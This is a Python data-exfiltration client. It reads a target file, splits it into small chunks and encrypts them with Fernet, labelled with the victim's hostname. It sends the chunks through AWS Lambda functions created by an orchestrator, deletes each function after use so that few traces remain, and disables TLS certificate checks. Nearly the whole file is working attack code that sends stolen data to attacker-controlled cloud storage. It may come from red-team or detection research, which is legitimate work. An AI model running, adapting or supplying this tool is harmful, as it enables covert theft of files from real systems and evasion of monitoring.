import boto3
import sys
import json
import os
import math
import socket
from cryptography.fernet import Fernet
import urllib3

key = b'<FERNET_KEY>'
orchestrator_function_name = '<ORCHESTRATOR_FUNCTION_NAME>'
aws_access_key_id = '<AWS_ACCESS_KEY_ID>'
aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>'
region = '<REGION>'

class Client():

	partitionSize = 100 #Change for desired partition size
	f = Fernet(key)

	def setFileName(self, filePath):
		self.filePath = filePath
		return

	#----------AWS Connection--------------
	def awsConnect(self, aws_access_key_id, aws_secret_access_key, region_name):
		self.session = boto3.session.Session(
			aws_access_key_id = aws_access_key_id, 
			aws_secret_access_key = aws_secret_access_key,
			region_name = region_name
		)
		self.aws_lambda = self.session.client('lambda', verify = False)

	def exfiltrate(self):
		print('--------------------------------------------------------------------------------')
		print('Started Exfiltration...')
		#----------We open the file and calculate the desired partitions--------------
		file = open(self.filePath, "rb")
		fileSize = os.stat(self.filePath).st_size
		partitions = math.ceil(fileSize/self.partitionSize)

		#----------We create Json with amout of partitions for the orchestrator--------------
		orqPayload = {
    		"partitions": partitions
		}
		orqPayload_json = json.dumps(orqPayload)

		#----------Orchestrator call with desired partitions--------------
		orq_response = self.aws_lambda.invoke(FunctionName = orchestrator_function_name, Payload = orqPayload_json)

		#----------Parsing the orchestrator answer, here we grab the lambda functions list--------------
		bytes_list = orq_response['Payload'].read()
		name_dict = bytes_list.decode()
		name_dict = json.loads(name_dict)
		lambda_list = name_dict['names']

		self.call_lambdas(file, lambda_list)

		print('...Finished exfiltration!')
		print('--------------------------------------------------------------------------------')

		file.close()

	#----------Calls to previously created lambda functions--------------
	def call_lambdas(self, file, lambda_list):

		for i in range(len(lambda_list)):
			#----------We read x bytes from the file--------------
			data = file.read(self.partitionSize)
			print(data.decode())
			#----------Data encrypt--------------
			data_encrypted = self.f.encrypt(data)
			extraName = self.filePath.split('/')
			newName = extraName[len(extraName)-1]
			newName = newName.replace('.txt','')
			hostname = socket.gethostname()
			#----------We put the partition inside a payload--------------
			data_payload = {
				'data': data_encrypted.decode(),
				'fileName': (str(hostname) + '-' + newName +'.'+ str(i))
			}
			data_payload_json = json.dumps(data_payload)

			#----------Call to lambda that puts the partition inside the bucket--------------
			invoke_response = self.aws_lambda.invoke(FunctionName = lambda_list[i], Payload = data_payload_json)
			#----------Lambda function delete--------------
			self.aws_lambda.delete_function(FunctionName = lambda_list[i])


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
client = Client()
client.awsConnect(aws_access_key_id, aws_secret_access_key, region)
client.setFileName(str(sys.argv[1]))
client.exfiltrate()



